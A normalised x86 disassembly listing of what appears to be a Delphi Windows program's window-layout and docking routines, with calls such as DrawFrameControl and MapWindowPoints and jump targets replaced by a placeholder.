cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_3aba400
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_3aba400
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_3aba400
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x40 ]
test al al
je r-xdata
mov eax ebx
call sub_3aba400
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_3aba4dc
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_3aba504
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_3aba4dc
call sub_3abae24
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_3aba504
call sub_3abae24
pop ecx
sub_3abaf38
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_3abad98
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_3aba504
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0x94 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_3aba754
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_3aba504
call sub_3abae24
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_3abafc0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_3a652a0
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_3a659c0
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_3abb008
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3abb34b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0xc ]
call sub_3abb90c
mov eax [ ebp - 0xc ]
movzx eax [ eax + 0x74 ]
mov [ ebp - 0x25 ] al
mov eax [ ebp - 0xc ]
call sub_3aba6e4
xor eax eax
push ebp
push sub_3abb326
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x1c ] 0x40000
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x70 ]
cmp eax [ ebp - 0x1c ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x74 ] 0x0
mov [ ebp - 0x26 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x70 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x3c ] 0x0
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0x0
lea eax [ ebp - 0x40 ]
push eax
push 0x1
lea edx [ ebp - 0x44 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d354
call sub_3a64c34
mov eax [ ebp - 0xc ]
lea edx [ eax + 0x74 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x26 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x20 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0xc ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0xc ]
cmp [ eax + 0x74 ] 0x0
je r-xdata
inc eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x1c ] 0x0
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
movzx edx [ ebp - 0x26 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0xc ]
call sub_3abc9fc
mov edx [ ebp - 0xc ]
mov [ edx + 0x68 ] eax
inc [ ebp - 0x1c ]
dec [ ebp - 0x30 ]
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x8 ]
mov si 0xffb7
call sub_3a6457c
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3abb32d
mov eax [ ebp - 0xc ]
movzx edx [ ebp - 0x25 ]
mov [ eax + 0x74 ] dl
mov eax [ ebp - 0xc ]
cmp [ eax + 0x64 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3ab9e84
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
cmp [ eax + 0x74 ] 0x0
je r-xdata
push ebp
lea eax [ ebp - 0x8 ]
call sub_3abafc0
pop ecx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_3aafaa8
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_3ab09c0
mov eax [ ebp - 0xc ]
call sub_3aba6e8
retn
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3ab9e84
mov edx [ ebp - 0xc ]
mov [ edx + 0x64 ] eax
push ebp
lea eax [ ebp - 0x8 ]
call sub_3abafc0
pop ecx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
movzx edx [ ebx + 0x10 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov ecx eax
mov edx [ ebx + 0x20 ]
mov eax [ ebp - 0xc ]
call sub_3abc9fc
mov [ ebx + 0x20 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_3aba1d0
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_3a64380
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
cmp [ esi + 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x24 ] esi
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x14 ]
test eax eax
jle r-xdata
mov [ ebp - 0x2c ] esi
mov esi [ esi + 0x18 ]
mov eax [ ebp - 0x2c ]
call sub_3a64380
mov eax [ ebp - 0x24 ]
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x24 ]
mov [ ebx + 0x18 ] eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x24 ] eax
inc [ ebp - 0x1c ]
dec [ ebp - 0x30 ]
jne r-xdata
sub_3abb35c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_3a78e1c
call sub_3abdd24
call sub_3abde2c
test al al
je r-xdata
push 0x0
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_3a8a340
push eax
call DrawFrameControl
call sub_3abdd24
lea ecx [ ebp - 0xc ]
mov dl 0x34
call sub_3abe0bc
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_3a8a340
push eax
call sub_3abdd24
lea ecx [ ebp - 0xc ]
pop edx
call sub_3abdee8
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3abb3f0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_3a89828
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_3a89fa0
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx edi
call sub_3a89f40
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_3a89f40
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_3a89828
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_3a89f40
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_3a89f40
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_3abb478
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx [ ebp + 0xc ]
mov edx edi
mov eax esi
call sub_3a78e1c
call sub_3abdd24
lea ecx [ ebp - 0xc ]
mov edx ebx
call sub_3abdfd0
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x8 ]
call sub_3a8a340
push eax
call sub_3abdd24
lea ecx [ ebp - 0xc ]
pop edx
call sub_3abdee8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_3abb4d4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
movzx eax [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_3abb35c
pop ecx
call sub_3abdd24
call sub_3abde2c
test al al
je r-xdata
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_3abb35c
pop ecx
call sub_3abdd24
call sub_3abde2c
test al al
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x4 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_3abb3f0
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x4 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_3abb3f0
pop ecx
push ebp
mov edx [ ebx + 0x8 ]
mov ecx [ ebp - 0x4 ]
sub edx [ ecx + 0x18 ]
sub edx 0x2
push edx
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0xa
push edx
mov ecx eax
inc ecx
mov edx [ ebx ]
add edx 0x2
mov al 0x2
call sub_3abb478
pop ecx
jmp r-xdata
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_3abb3f0
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_3abb3f0
pop ecx
jmp r-xdata
push ebp
mov eax [ ebx ]
mov edx eax
add edx 0xa
push edx
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov ecx [ ebx + 0x4 ]
mov edx [ ebp - 0x4 ]
add ecx [ edx + 0x18 ]
inc ecx
mov edx eax
inc edx
mov al 0x3
call sub_3abb478
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_3abb628
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a89cb0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3abb74c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_3aae42c
mov eax [ ebp - 0x4 ]
call sub_3a89f78
xor eax eax
push ebp
push sub_3abb72f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3a8a3c8
xor eax eax
push ebp
push sub_3abb712
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_3ab3ba4
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3abb719
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_3a8a3c8
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0x94 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_3ab3b68
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_3aaf4a0
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x20 ]
sub_3abb75c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_3ab6680
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_3aaf540
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_3aaf4fc
mov ecx eax
xor edx edx
xor eax eax
call sub_3a78e1c
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_3ab7c38
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
movzx eax [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov ecx 0x2
add eax 0xc
push eax
mov eax [ eax ]
cdq
idiv ecx
pop edx
mov [ edx ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
movzx edx [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
movzx eax [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov ecx 0x2
add eax 0x8
push eax
mov eax [ eax ]
cdq
idiv ecx
pop edx
mov [ edx ] eax
jmp r-xdata
dec al
je r-xdata
movzx eax [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3a78e44
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_3abb8d8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_3abb8d8
pop ecx
mov eax ebx
call sub_3a64380
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_3abb8d8
pop ecx
sub_3abb90c
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_3abb8d8
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_3a64380
xor eax eax
mov [ esi + 0x64 ] eax
sub_3abb968
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3aba754
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_3abb9a8
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x90 ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x80 ]
sub_3abb9a8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_3abbc39
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3a67194
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_3a67194
mov edx [ ebp - 0x8 ]
pop eax
call sub_3a6556c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d318
call sub_3a64c34
mov eax [ ebx + 0x14 ]
call sub_3ab9ea8
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_3a67194
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_3a67194
mov edx [ ebp - 0x10 ]
pop eax
call sub_3a6556c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d318
call sub_3a64c34
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_3a64380
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3abbc40
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_3a652c4
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_3aba284
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_3aba400
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_3aba43c
mov eax [ ebx + 0x18 ]
call sub_3aba284
mov [ edx + 0x18 ] eax
push esi
push sub_3abc2b8
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_3aba7bc
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_3aba43c
mov eax [ esi + 0x64 ]
call sub_3aba400
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_3a64380
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_3abc290
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_3a64380
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_3ab9f60
mov edx eax
mov eax edi
call sub_3aba428
mov eax edi
call sub_3aba284
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_3a64380
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x18 ]
mov [ eax + 0x18 ] edx
mov edx [ edi + 0x8 ]
cmp [ edx + 0x18 ] 0x0
jne r-xdata
push esi
push sub_3abc2b8
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_3aba7bc
jmp r-xdata
mov edx [ edi + 0x8 ]
mov edx [ edx + 0x18 ]
mov [ edx + 0xc ] eax
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
push esi
push sub_3abc2b8
mov edx [ eax + 0x14 ]
mov eax esi
call sub_3aba7bc
mov eax [ ebx + 0x14 ]
call sub_3a64380
mov eax edi
call sub_3a64380
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_3abbc48
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_3ab6680
test eax eax
jle r-xdata
cmp [ edi + 0x38 ] 0x0
jne r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x90 ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
movzx edx [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_3a69360
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_3aba428
